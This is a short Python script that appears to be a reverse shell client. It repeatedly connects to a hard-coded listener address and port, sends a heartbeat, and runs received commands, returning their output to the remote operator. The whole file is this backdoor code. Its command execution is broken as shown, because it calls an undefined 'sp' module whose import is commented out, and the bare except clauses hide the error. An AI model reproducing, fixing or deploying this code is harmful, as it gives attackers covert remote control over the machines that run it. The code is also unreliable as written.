import socket
import threading
import sys
import time
#from subprocess import run
LHOST = "10.100.3.131"
LPORT = 5555

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def TryAgain():
    while True:
        try:
            client.connect((LHOST,LPORT))
            Cont()
            break
        except:
            pass

def Cont():
    try:
        def getCommand():
           while True:
                try:
                    msg = client.recv(2048).decode('ascii')
                    output = sp.getoutput(msg)
                    client.send(output.encode('ascii'))
                except:
                    pass

        def sendConnection():
            while True:       
                client.send('CONNECTED'.encode('ascii'))
                time.sleep(250)       
        commandThread = threading.Thread(target=getCommand)
        sendSignalThread = threading.Thread(target=sendConnection)
        sendSignalThread.start()
        commandThread.start()
    except:
        TryAgain()
    
TryAgain()
    
